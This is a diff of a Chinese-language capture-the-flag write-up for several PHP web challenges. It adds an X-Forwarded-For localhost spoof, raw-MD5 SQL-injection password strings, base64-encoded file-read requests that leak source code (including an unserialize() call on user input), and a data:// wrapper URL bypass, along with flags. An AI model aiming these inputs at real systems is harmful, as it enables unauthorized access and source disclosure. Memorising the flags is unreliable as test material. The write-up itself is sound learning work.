@@ -6,13 +6,71 @@
     - 至今没有思路
 
 2. LOCALHOST
+    - `X-Forwarder-For: 127.0.0.1`
 
 3. Login
-    - [SQL injection with raw MD5 hashes](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
-    - password 129581926211651571912466741651878684928  or 1839431
+
+    - password 129581926211651571912466741651878684928 or 1839431
     - `PCTF{R4w_md5_is_d4ng3rous}`
+    - [SQL injection with raw MD5 hashes](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
+    - [SQL injection with raw MD5 hashes ](http://www.joychou.org/index.php/web/SQL-injection-with-raw-MD5-hashes.html?utm_source=tuicool)
 
 4. 神盾局的秘密
+    > 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？
+
+    - 题面源码很短：`<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>`
+    - 发现参数`img`的值为`c2hpZWxkLmpwZw==`，看起来好像是Base64的样子（根据曹小白的说法：1. 末尾有等号；2. 大小写混杂，解码后发现为`shield.jpg`，进一步验证想法。
+    - 通过 `view-source:http://web.phrack.top:32779/showimg.php?img=c2hvd2ltZy5waHA=` 查看 `showimg.php` 源码：
+        ```
+        <?php
+        	$f = $_GET['img'];
+        	if (!empty($f)) {
+        		$f = base64_decode($f);
+        		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
+        		&& stripos($f,'pctf')===FALSE) {
+        			readfile($f);
+        		} else {
+        			echo "File not found!";
+        		}
+        	}
+        ?>
+        ```
+    - `showimg.php` 源码中规定了`img`参数的打开规则：
+        - 不允许包含`..`, `/`, `\\`, `pctf` 等字符
+        - 传入的参数需要经过Base64编码
+    - 尝试通过 `view-source:http://web.phrack.top:32779/showimg.php?img=aW5kZXgucGhw` 查看 `index.php` ：
+        ```
+        <?php
+        	require_once('shield.php');
+        	$x = new Shield();
+        	isset($_GET['class']) && $g = $_GET['class'];
+        	if (!empty($g)) {
+        		$x = unserialize($g);
+        	}
+        	echo $x->readfile();
+        ?>
+        <img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
+        ```
+    - 发现一个叫做`shield.php`的东西，`view-source:http://web.phrack.top:32779/showimg.php?img=c2hpZWxkLnBocA==` 得到：
+        ```
+        <?php
+        	//flag is in pctf.php
+        	class Shield {
+        		public $file;
+        		function __construct($filename = '') {
+        			$this -> file = $filename;
+        		}
+
+        		function readfile() {
+        			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
+        			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
+        				return @file_get_contents($this->file);
+        			}
+        		}
+        	}
+        ?>
+        ```
+    - 发现`//flag is in pctf.php`，简直开心，直接访问`view-source:http://web.phrack.top:32779/showimg.php?img=cGN0Zi5waHA=`获取flag，然而`File not found!`。
 
 5. IN A Mess
 
@@ -49,7 +107,7 @@
             print "work harder!harder!harder!";
         }
         ```
-    - 通过代码可以得知，如果我们想要得到`flag.txt`则需要以下满足~~四~~五个条件：
+    - 通过代码可以得知，如果我们想要得到`flag.txt`则需要以下满足五个条件：
         1. `$data=="1112 is a nice lab!"`，其中`$data = @file_get_contents($a,'r')`
         2. `$id==0`
         3. `strlen($b)>5`
@@ -57,5 +115,7 @@
         5. `substr($b,0,1)!=4`
     - 所以构造出可以获得flag的连接：`index.php?id=0 & a=data:text/plain,1112%20is%20a%20nice%20lab! & b=......`
     - `index.php?id=0a&a=data:text/plain,1112%20is%20a%20nice%20lab!&b=.whaterever`
+    - [PHP中的header（）函数](http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html)
+    -
 
 6. RE?
